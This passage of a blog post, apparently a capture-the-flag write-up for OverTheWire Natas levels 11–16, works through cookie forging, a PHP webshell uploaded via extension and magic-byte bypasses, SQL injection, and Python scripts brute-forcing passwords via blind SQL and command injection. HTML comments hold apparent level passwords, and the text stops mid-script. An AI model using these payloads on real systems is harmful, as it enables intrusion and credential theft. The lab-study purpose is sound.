+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">$result</span> <span style="color:#ff6ac1">=</span> urlencode(base64_encode(xor_encrypt(json_encode(<span style="color:#ff5c57">$contents_to_encode</span>))));
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> (<span style="color:#ff5c57">$i</span><span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>; <span style="color:#ff5c57">$i</span> <span style="color:#ff6ac1">&lt;</span> strlen(<span style="color:#ff5c57">$final_cookie</span>); <span style="color:#ff5c57">$i</span><span style="color:#ff6ac1">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> (<span style="color:#ff5c57">$result</span>[<span style="color:#ff5c57">$i</span>] <span style="color:#ff6ac1">!=</span> <span style="color:#ff5c57">$final_cookie</span>[<span style="color:#ff5c57">$i</span>]) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">print</span>(<span style="color:#5af78e">&#39;wrong&#39;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">print</span>(<span style="color:#5af78e">&#39;correct&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$encoded_cookie</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D&#34;</span>; <span style="color:#78787e"># from inspecting webpage
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span><span style="color:#ff5c57">$cookie_contents</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">array</span>(<span style="color:#5af78e">&#34;showpassword&#34;</span><span style="color:#ff6ac1">=&gt;</span><span style="color:#5af78e">&#34;no&#34;</span>, <span style="color:#5af78e">&#34;bgcolor&#34;</span><span style="color:#ff6ac1">=&gt;</span><span style="color:#5af78e">&#34;#ffffff&#34;</span>);
+</span></span><span style="display:flex;"><span>test(<span style="color:#ff5c57">$cookie_contents</span>, <span style="color:#ff5c57">$encoded_cookie</span>);
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span></code></pre></div><p>(test assumes background of #ffffff when <code>$encoded_cookie</code> is retrieved)</p>
+<p>Finally, we can modify the cookie using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$desired</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">array</span>(<span style="color:#5af78e">&#34;showpassword&#34;</span><span style="color:#ff6ac1">=&gt;</span><span style="color:#5af78e">&#34;yes&#34;</span>, <span style="color:#5af78e">&#34;bgcolor&#34;</span><span style="color:#ff6ac1">=&gt;</span><span style="color:#5af78e">&#34;#654321&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">print</span>(urlencode(base64_encode(xor_encrypt(json_encode(<span style="color:#ff5c57">$desired</span>)))));
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span></code></pre></div><p>Once we change this cookie value to this new one and reload the webpage, we get the flag.</p>
+<!-- YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG -->
+<h3 id="a-namelevel-12a-level-12"><a name="level-12"></a> Level 12</h3>
+<p>This webpage allows us to upload files - perfect setup for deploying a webshell. Looking at the source code, we realise that even though we are allowed to upload a any type of file, the program effectively &lsquo;converts&rsquo; the file to a jpeg by renaming the name of the file to a randomly generated string and appending &lsquo;.jpg&rsquo; to the end of the name.</p>
+<p>To see this in action, consider the following PHP script <code>test.php</code> we will use to conduct a proof of concept:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">print</span> <span style="color:#5af78e">&#34;Hello world&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span></code></pre></div><p>If we use Burpsuite&rsquo;s proxy feature to intercept the traffic when we upload <code>test.php</code>, we see the following:</p>
+<p><a href="/images/otw_natas/natas12-1_first-renaming.png"><img src="/images/otw_natas/natas12-1_first-renaming.png" alt="intercepted network traffic"></a></p>
+<p>We see in line 23 that <code>test.php</code> which we uploaded has been renamed to a random string ending with &lsquo;.jpg&rsquo;.</p>
+<p>This is the bit in the source code which does the first renaming before the request is sent to the server (first renaming):</p>
+<p><a href="/images/otw_natas/natas12-2_first-renaming.png"><img src="/images/otw_natas/natas12-2_first-renaming.png" alt="first renaming before request sent to server"></a></p>
+<p>The server actually renames the file once again - this is the code which does this second round of renaming:</p>
+<p><a href="/images/otw_natas/natas12-3_second-renaming.png"><img src="/images/otw_natas/natas12-3_second-renaming.png" alt="second renaming on server side"></a></p>
+<p><code>$fn</code> is the filename passed to the server, i.e. the output of the first round of renaming detailed above. Notice that <code>$ext</code>, the extension, isn&rsquo;t renamed, it is just appended.</p>
+<p>This means that if we are able to change &lsquo;.jpg&rsquo; back to &lsquo;.php&rsquo; after the first renaming but before it is sent to the server, then our PHP file should still be able to run as expected on the server.</p>
+<p>To achieve this, we can simply change the file extension in the intercepted burpsuite traffic from &lsquo;jpg&rsquo; to &lsquo;php&rsquo;. If we do this, we see that the website says that the file uploaded is a PHP file instead of a JPG:</p>
+<p><a href="/images/otw_natas/natas12-4_bypass-first-renaming.png"><img src="/images/otw_natas/natas12-4_bypass-first-renaming.png" alt="changing the request in burpsuite to bypass first renaming"></a></p>
+<p><a href="/images/otw_natas/natas12-5_successful-upload.png"><img src="/images/otw_natas/natas12-5_successful-upload.png" alt="successful upload of PHP file"></a></p>
+<p>and if we navigate to the location of the uploaded file (click on the hyperlink), we get the following:</p>
+<p><a href="/images/otw_natas/natas12-6_poc-success.png"><img src="/images/otw_natas/natas12-6_poc-success.png" alt="PHP script successfully executed"></a></p>
+<p>- which indicates that the PHP script has been successfully uploaded and executed.</p>
+<p>We can now upload a PHP webshell script using the same steps. The webshell script I used (which I named <code>payload.php</code> is the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php <span style="color:#ff6ac1">echo</span> shell_exec(<span style="color:#ff5c57">$_GET</span>[<span style="color:#5af78e">&#39;command&#39;</span>]<span style="color:#ff6ac1">.</span><span style="color:#5af78e">&#39; 2&gt;&amp;1&#39;</span>); <span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span></code></pre></div><p>Once the file has been uploaded to the server, we use the webshell by passing in shell commands using the &lsquo;command&rsquo; url parameter. For example, if the site says that the file has been uploaded to</p>
+<blockquote>
+<p><code>natas12.natas.labs.overthewire.org/upload/abcdefg.php</code></p>
+</blockquote>
+<p>we run commands by making HTTP GET requests to</p>
+<blockquote>
+<p><code>natas12.natas.labs.overthewire.org/upload/abcdefg.php?command=&lt;command we want to run&gt;</code>, e.g. <code>natas12.natas.labs.overthewire.org/upload/abcdefg.php?command=ls</code></p>
+</blockquote>
+<p>We can use Burpsuite&rsquo;s repeater function to make things easier:</p>
+<p><a href="/images/otw_natas/natas12-7_rce.png"><img src="/images/otw_natas/natas12-7_rce.png" alt="running commands using repeater"></a></p>
+<p>Take note that commands need to be URL encoded (you can consider using the &lsquo;URL-encode as you type&rsquo; feature in Repeater). The final step is just to <code>cat</code> the contents of <code>/etc/natas_webpass/natas13</code> to get the password for natas13.</p>
+<p>Additional note: it just occured to me that we probably didn&rsquo;t need to deploy a whole webshell, we could have just uploaded a PHP script which executed a command to print the password of natas13.</p>
+<!-- lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9 -->
+<h3 id="a-namelevel-13a-level-13"><a name="level-13"></a> Level 13</h3>
+<p>This site is the same as natas12, except that the server now uses the PHP function <code>exif_imagetype</code> to check if the uploaded file is indeed an image file by checking the first few bytes of the uploaded file, i.e. its <a href="https://en.wikipedia.org/wiki/File_format#Magic_number">file signature / magic bytes</a>.</p>
+<p>All we have to do to pass this check is modify the magic bytes of any file we are going to upload. I decided to disguise <code>payload.php</code> (same as previous question) as a PNG. I can do so by first <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">looking up</a> the magic bytes of PNG files, which is <code>89 50 4E 47 0D 0A 1A 0A</code>, and then inserting these bytes right at the start of <code>payload.php</code>. The latter can be done using a tool like hex fiend:</p>
+<p><a href="/images/otw_natas/natas13-1_hex-fiend.png"><img src="/images/otw_natas/natas13-1_hex-fiend.png" alt="editing magic bytes using hex fiend"></a></p>
+<p>The additional bytes won&rsquo;t affect the operation of the webshell script.</p>
+<p>After uploading the modified <code>payload.php</code> in the same way as the previous level, we can look at the contents of <code>/etc/natas_webpass/natas14</code> and access the next level (repeater might not work, can use proxy feature to send commands).</p>
+ <!-- qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP -->
+<h3 id="a-namelevel-14a-level-14"><a name="level-14"></a> Level 14</h3>
+<p>This webpage asks for login details, which hints that an SQL injection is in order. The relevant bit of source code is this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$query</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;SELECT * from users where username=</span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e">&#34;</span><span style="color:#ff6ac1">.</span><span style="color:#ff5c57">$_REQUEST</span>[<span style="color:#5af78e">&#34;username&#34;</span>]<span style="color:#ff6ac1">.</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e"> and password=</span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e">&#34;</span><span style="color:#ff6ac1">.</span><span style="color:#ff5c57">$_REQUEST</span>[<span style="color:#5af78e">&#34;password&#34;</span>]<span style="color:#ff6ac1">.</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span>(array_key_exists(<span style="color:#5af78e">&#34;debug&#34;</span>, <span style="color:#ff5c57">$_GET</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">echo</span> <span style="color:#5af78e">&#34;Executing query: </span><span style="color:#5af78e">$query</span><span style="color:#5af78e">&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span>(mysqli_num_rows(mysqli_query(<span style="color:#ff5c57">$link</span>, <span style="color:#ff5c57">$query</span>)) <span style="color:#ff6ac1">&gt;</span> <span style="color:#ff9f43">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">echo</span> <span style="color:#5af78e">&#34;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span></code></pre></div><p>The code builds an SQL query string based on the values of username and password supplied by the user and queries the database to see if any entries match the username and password supplied.</p>
+<p>The query is built as such:</p>
+<pre tabindex="0"><code>$query = &#34;SELECT * from users where username=\&#34;&#34; + $_REQUEST[&#34;username&#34;] + &#34;\&#34; and password=\&#34;&#34; + $_REQUEST[&#34;password&#34;] + &#34;\&#34;&#34;
+</code></pre><p>As an example, if we enter <code>john</code> as username and <code>doe</code> as the password, the query which will be built and executed is:</p>
+<blockquote>
+<p>SELECT * from users where username=&ldquo;john&rdquo; and password=&ldquo;doe&rdquo;</p>
+</blockquote>
+<p>(outermost &quot; ommitted for clarity)</p>
+<p>We can perform an sql injection by entering the classic payload <code>&quot; or 1=1 --</code> as the username. This works because the resulting query will look like this:</p>
+<blockquote>
+<p>SELECT * from users where username=&rdquo;&rdquo; or 1=1 &ndash; and password=&ldquo;doe&rdquo;</p>
+</blockquote>
+<p>&lsquo;&ndash;&rsquo; comments out everything to the right of it. This means that the password clause of the query won&rsquo;t be executed at all, hence it doesn&rsquo;t even matter what we enter in the password field.</p>
+<p>The leading &quot; at the start of the injection string is meant to close the matching hard-coded &quot; character before it to prevent a syntax error. Notice that since 1=1 is necessarily true, the condition specified for the username is true for every single entry in the database, i.e. every entry in the database fulfils this query. As such, the number of rows which matches the query is guaranteed to be &gt; 0, allowing us access and giving us the password for natas15.</p>
+<!-- TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB -->
+<h3 id="a-namelevel-15a-level-15"><a name="level-15"></a> Level 15</h3>
+<p>Unlike the previous level, this site seems to only allow us to query whether a user exists or not but not what the user&rsquo;s password is.</p>
+<p>However, we see some commented-out code in the source which details the structure of the database table:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff6ac1">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e">CREATE TABLE `users` (
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e">  `username` varchar(64) DEFAULT NULL,
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e">  `password` varchar(64) DEFAULT NULL
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e">);
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e">*/</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">...</span>
+</span></span></code></pre></div><p>Since we know that the table contains usernames and passwords in the database and &lsquo;username&rsquo; is SQL-injectable just like the previous level, what we can do is brute-force a particular user&rsquo;s password using a specially crafted query.</p>
+<p>If we enter &rsquo;natas16&rsquo; into the site, it tells us that the user exists in the database. We can brute force natas16&rsquo;s password by extending the query to also check for the password of the user, and examine the response from the server. We need to use the <code>%</code> placeholder to indicate &lsquo;zero or more characters&rsquo;. For example, the following query:</p>
+<blockquote>
+<p>SELECT * from users where username=&ldquo;natas16&rdquo; and password like BINARY &ldquo;foo%&rdquo;</p>
+</blockquote>
+<p>checks whether there are any users with username &ldquo;natas16&rdquo; <em>and</em> whether their password begins with &ldquo;foo&rdquo; followed by zero or more characters. If the response from the server is positive, i.e. that the user exists, then we know that the password begins with &lsquo;foo&rsquo;, and can then proceed on to guess the next character in the password.</p>
+<p>We start with guessing the first character of the password. Once we find a character with a positive response, we know that that character is the first character of natas16&rsquo;s password, and can then move on to the second character, and so on. We stop when we try to extend the password but don&rsquo;t get any positive responses.</p>
+<p>We also have to use the <code>BINARY</code> keyword to perform <a href="https://www.w3schools.com/mysql/func_mysql_binary.asp">byte-level comparison</a> instead of character level comparison so that evaluation is case sensitive, i.e. without <code>BINARY</code> &ldquo;a&rdquo; == &ldquo;A&rdquo; will evaluate to true.</p>
+<p>The following script is an implementation of the ideas above:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> requests.auth <span style="color:#ff6ac1">import</span> HTTPBasicAuth
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">make_query</span>(base, char):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#5af78e">&#34;natas16</span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e"> and password like BINARY </span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e">&#34;</span> <span style="color:#ff6ac1">+</span> base <span style="color:#ff6ac1">+</span> char <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#34;%</span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e"> #&#34;</span> <span style="color:#78787e"># builds SQL injection query</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">is_correct</span>(response):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> response<span style="color:#ff6ac1">.</span>text<span style="color:#ff6ac1">.</span>find(<span style="color:#5af78e">&#39;This user exists.&#39;</span>) <span style="color:#ff6ac1">!=</span> <span style="color:#ff6ac1">-</span><span style="color:#ff9f43">1</span> <span style="color:#78787e"># checks if positive response is received</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;http://natas15.natas.labs.overthewire.org/index.php&#34;</span>
+</span></span><span style="display:flex;"><span>basic <span style="color:#ff6ac1">=</span> HTTPBasicAuth(<span style="color:#5af78e">&#34;natas15&#34;</span>, <span style="color:#5af78e">&#34;&lt;password for this level&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff6ac1">=</span> {<span style="color:#5af78e">&#34;username&#34;</span>:<span style="color:#5af78e">&#34;&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chars <span style="color:#ff6ac1">=</span> [<span style="color:#5af78e">&#39;A&#39;</span>, <span style="color:#5af78e">&#39;B&#39;</span>, <span style="color:#5af78e">&#39;C&#39;</span>, <span style="color:#5af78e">&#39;D&#39;</span>, <span style="color:#5af78e">&#39;E&#39;</span>, <span style="color:#5af78e">&#39;F&#39;</span>, <span style="color:#5af78e">&#39;G&#39;</span>, <span style="color:#5af78e">&#39;H&#39;</span>, <span style="color:#5af78e">&#39;I&#39;</span>, <span style="color:#5af78e">&#39;J&#39;</span>, <span style="color:#5af78e">&#39;K&#39;</span>, <span style="color:#5af78e">&#39;L&#39;</span>, <span style="color:#5af78e">&#39;M&#39;</span>, <span style="color:#5af78e">&#39;N&#39;</span>, <span style="color:#5af78e">&#39;O&#39;</span>, <span style="color:#5af78e">&#39;P&#39;</span>, <span style="color:#5af78e">&#39;Q&#39;</span>, <span style="color:#5af78e">&#39;R&#39;</span>, <span style="color:#5af78e">&#39;S&#39;</span>, <span style="color:#5af78e">&#39;T&#39;</span>, <span style="color:#5af78e">&#39;U&#39;</span>, <span style="color:#5af78e">&#39;V&#39;</span>, <span style="color:#5af78e">&#39;W&#39;</span>, <span style="color:#5af78e">&#39;X&#39;</span>, <span style="color:#5af78e">&#39;Y&#39;</span>, <span style="color:#5af78e">&#39;Z&#39;</span>, <span style="color:#5af78e">&#39;a&#39;</span>, <span style="color:#5af78e">&#39;b&#39;</span>, <span style="color:#5af78e">&#39;c&#39;</span>, <span style="color:#5af78e">&#39;d&#39;</span>, <span style="color:#5af78e">&#39;e&#39;</span>, <span style="color:#5af78e">&#39;f&#39;</span>, <span style="color:#5af78e">&#39;g&#39;</span>, <span style="color:#5af78e">&#39;h&#39;</span>, <span style="color:#5af78e">&#39;i&#39;</span>, <span style="color:#5af78e">&#39;j&#39;</span>, <span style="color:#5af78e">&#39;k&#39;</span>, <span style="color:#5af78e">&#39;l&#39;</span>, <span style="color:#5af78e">&#39;m&#39;</span>, <span style="color:#5af78e">&#39;n&#39;</span>, <span style="color:#5af78e">&#39;o&#39;</span>, <span style="color:#5af78e">&#39;p&#39;</span>, <span style="color:#5af78e">&#39;q&#39;</span>, <span style="color:#5af78e">&#39;r&#39;</span>, <span style="color:#5af78e">&#39;s&#39;</span>, <span style="color:#5af78e">&#39;t&#39;</span>, <span style="color:#5af78e">&#39;u&#39;</span>, <span style="color:#5af78e">&#39;v&#39;</span>, <span style="color:#5af78e">&#39;w&#39;</span>, <span style="color:#5af78e">&#39;x&#39;</span>, <span style="color:#5af78e">&#39;y&#39;</span>, <span style="color:#5af78e">&#39;z&#39;</span>, <span style="color:#5af78e">&#39;0&#39;</span>, <span style="color:#5af78e">&#39;1&#39;</span>, <span style="color:#5af78e">&#39;2&#39;</span>, <span style="color:#5af78e">&#39;3&#39;</span>, <span style="color:#5af78e">&#39;4&#39;</span>, <span style="color:#5af78e">&#39;5&#39;</span>, <span style="color:#5af78e">&#39;6&#39;</span>, <span style="color:#5af78e">&#39;7&#39;</span>, <span style="color:#5af78e">&#39;8&#39;</span>, <span style="color:#5af78e">&#39;9&#39;</span>] <span style="color:#78787e"># all possible characters in the password</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>base <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;&#34;</span> <span style="color:#78787e"># current known correct password</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">for</span> i <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">range</span>(<span style="color:#ff9f43">64</span>):
+</span></span><span style="display:flex;"><span>    original_length <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">len</span>(base)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> c <span style="color:#ff6ac1">in</span> chars:
+</span></span><span style="display:flex;"><span>        query <span style="color:#ff6ac1">=</span> make_query(base, c)
+</span></span><span style="display:flex;"><span>        payload[<span style="color:#5af78e">&#34;username&#34;</span>] <span style="color:#ff6ac1">=</span> query
+</span></span><span style="display:flex;"><span>        response <span style="color:#ff6ac1">=</span> requests<span style="color:#ff6ac1">.</span>post(url, auth<span style="color:#ff6ac1">=</span>basic, params<span style="color:#ff6ac1">=</span>payload)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> is_correct(response):
+</span></span><span style="display:flex;"><span>            base <span style="color:#ff6ac1">+=</span> c
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">print</span>(base)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> original_length <span style="color:#ff6ac1">==</span> <span style="color:#ff5c57">len</span>(base): <span style="color:#78787e"># terminate when base can no longer be extended</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;password is: &#34;</span> <span style="color:#ff6ac1">+</span> base)
+</span></span></code></pre></div><p>The main <code>for</code> loop guesses up to 64 chars (because password is defined with 64 chars in the source code), and iterates over each character in <code>chars</code>. It builds a new query for the current char, posts this to the endpoint using the <code>requests</code> library, and inspects the response. If the response is positive, the current character is added to <code>base</code> and the loop restarts to guess the next character in the password, else the next possible character is tried. When all possibilities are tried and the known password can&rsquo;t be extended anymore, the current known password is printed to the console.</p>
+<p>The output of running the code looks like this:</p>
+<p><a href="/images/otw_natas/natas15-1_result.png"><img src="/images/otw_natas/natas15-1_result.png" alt="result of running brute forcing script"></a></p>
+<!-- TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V -->
+<h3 id="a-namelevel-16a-level-16"><a name="level-16"></a> Level 16</h3>
+<p>I initially thought the challenge was to bypass <code>preg_match</code> filtering to dump the contents of <code>dictionary.txt</code> to locate a string inside it.</p>
+<p>After trying and getting nowhere, I looked for some hints and realised that the challenge was actually to get the password from <code>/etc/web_pass/natas17</code> using command injections.</p>
+<p>We can inject commands by enclosing them in <code>$()</code> and entering this into the search box. Suppose we enter <code>$(echo nuts)</code> in the search box. The complete command which will be ran on the server is <code>grep -i $(echo nuts) dictionary.txt</code>. Because <code>echo nuts</code> is enclosed in <code>$()</code>, it will be executed first, which means the command which is ultimately executed on the server is <code>grep -i nuts dictionary.txt</code>. We will hence expect to see all words in <code>dictionary.txt</code> containing &rsquo;nuts&rsquo; to show up, like this:</p>
+<p><a href="/images/otw_natas/natas16-1_command-injection-demo.png"><img src="/images/otw_natas/natas16-1_command-injection-demo.png" alt="command injection demo"></a></p>
+<p>We can use an approach similar to the previous stage, where we brute force the characters in the password one by one. We can inject <code>grep ^&lt;base + c&gt; /etc/natas_webpass/natas17</code> to check if the <code>natas17</code> password starts with <code>&lt;base + c&gt;</code>; the &lsquo;^&rsquo; character is a regex anchor meant to denote &lsquo;at the start of line&rsquo;. If <code>/etc/web_pass/natas17</code> starts with <code>&lt;base + c&gt;</code>, the output will be the natas17 password, and if it doesn&rsquo;t, there will be no output.</p>
+<p>Let us refer to the <code>grep</code> on <code>/etc/natas_webpass/natas17</code> which will be enclosed in <code>$()</code> as the &lsquo;<em>inner</em> grep&rsquo;, and the <code>grep</code> on <code>dictionary.txt</code> as the &lsquo;<em>outer</em> grep&rsquo;.</p>
+<p>Since we are unable to directly observe the output of the inner grep, we have to observe the output of the outer grep to determine the output of the inner grep.</p>
+<p>We know that if <code>grep</code> successfully finds a line containing the string to search for, then it outputs the entire line, else it outputs nothing. So if we use <code>grep</code> on the natas17 password file and manage to guess the start of the password, the inner grep outputs the entire password. The outer grep then looks for this password in <code>dictionary.txt</code>. Since the password for natas17 is just a bunch of random characters, the output of this outer grep command will be nothing. This means that if we observe no words being printed out to the screen then the guess we made was correct.</p>
+<p>We still need a way to tell when our guess was wrong. To do this we can append a legitimate word onto the end of the <code>$()</code> command and search for that legitimate string in the output of the outer grep command. This works because if the inner grep doesn&rsquo;t find anything, it won&rsquo;t output anything, i.e. it will output a blank string, which means the outer grep will look for blank string + legitimate word = legitimate word in dictionary.txt.</p>
+<p>To summarise:</p>
+<p><a href="/images/otw_natas/natas16-2_summary-of-approach.png"><img src="/images/otw_natas/natas16-2_summary-of-approach.png" alt="summary of approach"></a></p>
+<p>which is implemented by the following python script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> requests.auth <span style="color:#ff6ac1">import</span> HTTPBasicAuth
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;http://natas16.natas.labs.overthewire.org/index.php&#34;</span>
+</span></span><span style="display:flex;"><span>basic <span style="color:#ff6ac1">=</span> HTTPBasicAuth(<span style="color:#5af78e">&#34;natas16&#34;</span>, <span style="color:#5af78e">&#34;&lt;password for natas16&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff6ac1">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#34;needle&#34;</span>:<span style="color:#5af78e">&#34;nuts&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chars <span style="color:#ff6ac1">=</span> [<span style="color:#5af78e">&#39;A&#39;</span>, <span style="color:#5af78e">&#39;B&#39;</span>, <span style="color:#5af78e">&#39;C&#39;</span>, <span style="color:#5af78e">&#39;D&#39;</span>, <span style="color:#5af78e">&#39;E&#39;</span>, <span style="color:#5af78e">&#39;F&#39;</span>, <span style="color:#5af78e">&#39;G&#39;</span>, <span style="color:#5af78e">&#39;H&#39;</span>, <span style="color:#5af78e">&#39;I&#39;</span>, <span style="color:#5af78e">&#39;J&#39;</span>, <span style="color:#5af78e">&#39;K&#39;</span>, <span style="color:#5af78e">&#39;L&#39;</span>, <span style="color:#5af78e">&#39;M&#39;</span>, <span style="color:#5af78e">&#39;N&#39;</span>, <span style="color:#5af78e">&#39;O&#39;</span>, <span style="color:#5af78e">&#39;P&#39;</span>, <span style="color:#5af78e">&#39;Q&#39;</span>, <span style="color:#5af78e">&#39;R&#39;</span>, <span style="color:#5af78e">&#39;S&#39;</span>, <span style="color:#5af78e">&#39;T&#39;</span>, <span style="color:#5af78e">&#39;U&#39;</span>, <span style="color:#5af78e">&#39;V&#39;</span>, <span style="color:#5af78e">&#39;W&#39;</span>, <span style="color:#5af78e">&#39;X&#39;</span>, <span style="color:#5af78e">&#39;Y&#39;</span>, <span style="color:#5af78e">&#39;Z&#39;</span>, <span style="color:#5af78e">&#39;a&#39;</span>, <span style="color:#5af78e">&#39;b&#39;</span>, <span style="color:#5af78e">&#39;c&#39;</span>, <span style="color:#5af78e">&#39;d&#39;</span>, <span style="color:#5af78e">&#39;e&#39;</span>, <span style="color:#5af78e">&#39;f&#39;</span>, <span style="color:#5af78e">&#39;g&#39;</span>, <span 